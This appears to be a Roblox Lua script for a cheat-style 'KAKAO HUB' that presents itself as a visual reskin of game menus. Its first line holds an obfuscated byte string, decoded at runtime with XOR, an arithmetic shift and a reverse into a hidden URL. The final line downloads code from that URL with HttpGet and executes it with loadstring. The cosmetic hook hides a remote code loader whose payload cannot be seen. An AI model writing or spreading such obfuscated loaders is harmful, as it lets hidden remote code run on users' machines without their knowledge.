
--[[ STAGE 2: VISUAL CORE ]]
local OKxgbUXJI0FoDwJ2F_="\158\176\157\101\184\140\146\202\149\164\220\173\012\232\244\009\010\250\060\054\232\209\240\221\252\065\096\065\082\099\120\076\106\111\095\112\130\172\168\060\180\166\143\160\164\164\167\184\179\192\193\002\252\232\244\243\250\237\006\025\044\008\005\025\030\047\092\230\043\052\066\060\004\071\077\096\116\102\116\112\143\133\064\139\168\145\162\156\170\168\186\181\188\193\136\204\212\230\159\251\235\248\013\253\004\022\043\028\056\056\051\068\053\079\066\078\011\106\098\121\036\042\067\146\149\151\157\143"local G6Qib0MbQasU9cpN=172 local X7hBk6gkKfpbmNs7=174 local KTSK7IKphBr2XCisL8miD=0 local VAoJZI3KfvI_lM8y=6 local jYsUqoyLxs872to7w_=29 local p4xIy88xWNC0vF6qxpH=true local qVhapjVMxRhYm=bit32 and bit32.bxor if not qVhapjVMxRhYm then qVhapjVMxRhYm=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local pq2drP6iyhKcG={}for qHNRv4qU3rzG2N=1,#OKxgbUXJI0FoDwJ2F_ do local mQWpVQ57GRTGTZlXu6l=string.byte(OKxgbUXJI0FoDwJ2F_,qHNRv4qU3rzG2N)local vRrYRzb42LqhHOfwx=(X7hBk6gkKfpbmNs7+(qHNRv4qU3rzG2N*VAoJZI3KfvI_lM8y)+jYsUqoyLxs872to7w_)%256 if KTSK7IKphBr2XCisL8miD==0 then mQWpVQ57GRTGTZlXu6l=(mQWpVQ57GRTGTZlXu6l-vRrYRzb42LqhHOfwx)%256 pq2drP6iyhKcG[qHNRv4qU3rzG2N]=string.char(qVhapjVMxRhYm(mQWpVQ57GRTGTZlXu6l,G6Qib0MbQasU9cpN))else mQWpVQ57GRTGTZlXu6l=qVhapjVMxRhYm(mQWpVQ57GRTGTZlXu6l,G6Qib0MbQasU9cpN)pq2drP6iyhKcG[qHNRv4qU3rzG2N]=string.char((mQWpVQ57GRTGTZlXu6l-vRrYRzb42LqhHOfwx)%256)end end local MdDv3sCAwdgVz=table.concat(pq2drP6iyhKcG)if p4xIy88xWNC0vF6qxpH then MdDv3sCAwdgVz=string.reverse(MdDv3sCAwdgVz)end local ZrGd10Khgza3Y7uTUhX=MdDv3sCAwdgVz
local HubName = "KAKAO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ZrGd10Khgza3Y7uTUhX))()
